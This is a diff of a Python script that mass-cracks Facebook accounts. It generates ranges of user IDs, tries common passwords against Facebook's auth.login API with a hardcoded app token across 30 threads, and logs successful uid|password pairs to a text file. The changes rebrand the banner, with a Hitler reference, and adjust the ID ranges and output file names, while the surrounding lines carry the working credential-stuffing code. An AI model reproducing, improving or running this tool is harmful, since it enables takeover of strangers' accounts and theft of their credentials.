@@ -402,14 +402,14 @@ logo = """
 888    Y88b 888         888.  8888888P"      
                                                                                
 \x1b[1;97m---------------------------------------------------
-\33[1;41mTOOLS UPDATE FOR FIRST SEND FRIEND REQUEST\33[0m
+\33[1;41mKHD-302 X RSU FATHER OF HITTLER\33[0m
 \x1b[1;97m---------------------------------------------------
 \x1b[1;97m[+] AUTHOR         : KHD 302 BRAND
 \x1b[1;97m[+] FB PAGE.       : ZEE BALOCH
 \x1b[1;97m[+] GITHUB.        : KHDFOUNDER   
 \x1b[1;97m[+] TEAM.          :\33[1;42m RSU_FAMILY \33[0m
 \x1b[1;97m[+] VERSION        :\x1b[1;97m 0.1  \x1b[1;97m          
-\x1b[1;97m--------------------------------------
+\x1b[1;97m--------------------------------------------------
 """
  
 class Main:
@@ -455,7 +455,7 @@ class Main:
 		print(" \033[1;32m[2] PUBLIC CLONING")
 		print(" \33[1;32m[3] PAK RENDOM CLONING")
 		print(" \033[1;32m[4] 2006 TO 2012 ")
-		print(" \33[1;32m[5] 2004 TO 2008 ")
+		print(" \33[1;32m[5] 2016 TO 2022 ")
 		print("\033[1;32m [E] ᴇxɪᴛ \n")
 		UZAIR =input(" \033[1;32mSELECT : ")
 		if UZAIR in ["1", "01"]:
@@ -475,9 +475,9 @@ class Main:
 			Main()
  
 	def old(self):
-		x = 111111111
-		xx = 999999999
-		idx = "100000" 
+		x = 1111111111
+		xx = 9999999999
+		idx = "10000" 
 		os.system('clear');print(logo)
 		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
 		try:
@@ -488,7 +488,7 @@ class Main:
 			
 			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n\033[1;32m [!] Ex(123456) FOR Old IDZ\033[1;37m ")
+				print("\n\033[1;32m [!] Exemple(123456 786786 112233 445566) FOR IDZ\033[1;37m ")
 				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
 					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
@@ -498,7 +498,7 @@ class Main:
 				print("     \033[0;93m   WELCOME TO FB CLONING WORLD")
 				print("\n\033[0;94m [+] START CLONING")
 				print(" \033[0;96m[+] NOTE: CP IDZ OPEN IN 15 DAYS")
-				print(" [!] IF NO RESULTS USE AEROPLANE FOR10 SECOND")
+				print(" [!] IF NO RESULTS USE AEROPLANE FOR 10 SECOND")
 				print("\033[0;94m----------------------------------------------")
 				print("\n")
 				print("\033[1;37m")
@@ -890,15 +890,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[1;32m[ZEE OK]%s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[KHD OK]%s | %s\033[1;32m         "%(uid, pw))
 				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("ZEE OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("KHD OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[1;32m[ZEE OK] %s | %s\033[1;32m         "%(uid, pw))
+				print("\r \033[1;32m[KHD OK] %s | %s\033[1;32m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("ZEE OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("KHD OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -908,7 +908,7 @@ class Main:
 	def old2(self):
 		x = 1111111111
 		xx = 9999999999
-		idx = "10000" 
+		idx = "1000" 
 		os.system('clear');print(logo)
 		limit = int(input("\n \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
 		try:
@@ -1321,10 +1321,10 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[1;32m[ZEE OK] %s | %s\033[0;32m         "%(uid, pw))
+				print("\r \033[1;32m[KHD OK] %s | %s\033[0;32m         "%(uid, pw))
 				print ("\r \033[1;32m Congrats ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("ZEE OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("KHD OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
 				print("\r \033[1;32m[ZEE OK] %s | %s\033[1;32m         "%(uid, pw))
